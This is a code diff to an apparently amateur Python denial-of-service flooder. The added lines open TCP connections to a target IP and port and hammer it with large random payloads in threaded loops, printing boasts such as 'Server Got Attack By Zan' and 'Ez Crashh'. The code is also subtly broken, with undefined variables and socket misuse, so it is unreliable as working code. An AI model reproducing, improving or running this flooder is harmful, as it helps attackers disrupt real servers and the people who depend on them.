@@ -137,15 +137,30 @@ def start2():
   global byte3, byte4
   byte3 = random._urandom(40552)
   byte4 = random.choice(acceptall)+random._urandom(23451)
+  acceppt = random.choice(socks5)+random.choice(acceptall)
+  byte_host = byte3 + byte4 + accept + "\r\n"
+  while True:
+            try:
+               s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+               s.connect((str(ip),int(port)))
+               s.send(byte_host)
+               for i in range(20000):
+                   s.connect((str(ip),int(port)))
+                   s.send(byte_host)
+                   print("Server Got Attack By Zan ")
+            except:
+                  s.close()
+                  print("Ez Crashh")
+                  
   return byte3
   return byte4
   
 def start():
   global useragents, acceptall, ref, socks5
+  time.sleep(0.01)
   hh = random._urandom(75006)
   xx = int(0)
-  time.sleep(0.01)
-  userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
+  userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+r+random.choice(ref)+random_.random(20152)+"\r\n"
   Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
   acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
   referrer = random.choice(ref)
@@ -168,4 +183,4 @@ def start():
 for i in range(th):
   th = threading.Thread(target=start)
   th.start()
-  
+  #aku mah pemula bisa apa?
